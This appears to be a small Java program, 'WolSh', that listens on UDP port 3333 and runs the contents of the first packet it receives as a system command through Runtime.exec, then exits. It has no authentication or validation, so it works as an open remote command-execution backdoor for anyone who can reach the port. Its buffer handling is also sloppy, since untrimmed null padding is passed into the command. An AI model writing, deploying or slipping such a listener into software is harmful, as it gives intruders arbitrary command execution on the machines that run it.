import java.io.IOException;
import java.util.Scanner;
import java.io.*;
import java.net.*;
public class WolSh
{
  public static void main(String[] args) throws Exception{

  int PORT = 3333;
  DatagramSocket svrSkt = new DatagramSocket(PORT);
  byte[] rData = new byte[1024];
  while (true){
    DatagramPacket rcvpkt = new DatagramPacket(rData,rData.length);
    svrSkt.receive(rcvpkt);
    String cmd = new String(rcvpkt.getData());
    Runtime rt = Runtime.getRuntime();
    Process pr = rt.exec(cmd);
    //System.out.println(cmd);
    if(cmd != null)
    {
      svrSkt.close();
      System.exit(0);
    }
  }


}
}
